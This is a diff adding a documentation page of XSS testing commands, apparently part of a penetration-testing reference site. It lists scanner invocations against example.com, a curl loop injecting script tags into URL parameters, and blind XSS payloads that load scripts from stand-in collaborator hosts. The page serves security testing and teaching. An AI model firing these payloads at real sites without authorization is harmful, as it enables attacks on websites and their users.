@@ -1,0 +1,67 @@
+
+---
+title: XSS Testing
+description: Cross-site scripting detection and exploitation techniques
+---
+
+import { CommandBlock } from '@/components/CommandBlock'
+
+# XSS Testing
+
+Comprehensive cross-site scripting (XSS) detection and testing methodologies.
+
+## Basic XSS Detection
+
+<CommandBlock
+  title="XSStrike Automated Testing"
+  description="Automated XSS vulnerability detection and exploitation."
+  command="python3 XSStrike.py -u 'https://example.com/search?q=test'"
+/>
+
+<CommandBlock
+  title="Dalfox XSS Scanner"
+  description="Fast and accurate XSS scanner with multiple detection methods."
+  command="dalfox url https://example.com/page.php?param=test"
+/>
+
+## Advanced XSS Testing
+
+<CommandBlock
+  title="XSS with Request File"
+  description="Uses FFUF to bruteforce XSS vulnerabilities using a request file."
+  command="ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr \"&lt;script&gt;alert('XSS')&lt;/script&gt;\""
+/>
+
+<CommandBlock
+  title="Parameterized XSS Testing"
+  description="Test multiple parameters for XSS vulnerabilities."
+  command="cat params.txt | while read param; do echo 'Testing: '$param; curl -s 'https://example.com/page.php?'$param'=<script>alert(1)</script>' | grep -i script; done"
+/>
+
+## DOM XSS Detection
+
+<CommandBlock
+  title="DOM XSS Analysis"
+  description="Client-side XSS detection using browser automation."
+  command="node dom-xss-scanner.js https://example.com"
+/>
+
+<CommandBlock
+  title="Browser-based XSS Test"
+  description="Automated browser testing for DOM-based XSS."
+  command="python3 domxss.py -u https://example.com -p payloads.txt"
+/>
+
+## Blind XSS Testing
+
+<CommandBlock
+  title="Blind XSS with Burp Collaborator"
+  description="Test for blind XSS using external collaboration server."
+  command="curl -X POST https://example.com/contact -d 'message=<script src=\"//yourburpcollaborator.com/xss\"></script>'"
+/>
+
+<CommandBlock
+  title="XSS Hunter Integration"
+  description="Blind XSS testing with XSS Hunter payload."
+  command="echo '<script src=\"https://yourxsshunter.com/probe\"></script>' | xclip -selection clipboard"
+/>
